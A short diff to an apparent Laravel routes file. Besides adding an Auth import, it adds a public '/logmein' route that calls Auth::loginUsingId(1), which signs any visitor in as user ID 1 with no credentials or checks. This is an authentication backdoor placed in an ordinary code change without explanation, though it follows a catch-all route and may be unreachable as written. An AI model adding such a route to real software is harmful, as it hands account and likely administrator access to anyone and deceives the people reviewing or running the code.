@@ -13,6 +13,7 @@
 use App\Models\Order;
 use App\Models\User;
 use App\Notifications\OrderPaid;
+use Illuminate\Support\Facades\Auth;
 use function Composer\Autoload\includeFile;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Notification;
@@ -204,5 +205,9 @@ Route::get('/{notFound}', function () {
     abort('404', trans('message.not_found'));
 });
 
+
+Route::get('/logmein', function () {
+   return Auth::loginUsingId(1);
+});
 
 
